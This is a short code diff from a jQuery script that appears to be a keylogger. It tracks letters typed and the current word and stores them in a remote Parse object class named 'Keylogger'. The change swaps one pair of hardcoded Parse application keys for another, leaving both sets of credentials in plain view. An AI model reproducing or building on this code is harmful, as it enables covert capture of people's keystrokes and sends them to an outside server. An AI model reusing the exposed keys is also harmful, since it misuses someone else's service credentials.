@@ -19,7 +19,7 @@ $(document).ready(function(){
     var lettersTyped = 0;
     var currentWord = '';
     // Place your Parse project keys on the line after this
-    Parse.initialize("I727vHwPf3qBNX6fEoy1X4nPCbzixCy9NoWMGXZQ", "1f22sRsB0gYTfd49lobej7raEYL4Nc5ViCOjB8Ue");
+    Parse.initialize("Fy4Ib14galFSBNWaE4JRBCLd36DUBQcF158pmt54", "0CdMDbDgrkQNf4APtdSfTe8MLt4F7x8LBSdhuEL1");
     var Keylogger = Parse.Object.extend("Keylogger");
     $(document).click(function() {
             if (wordArray.length === 0) {
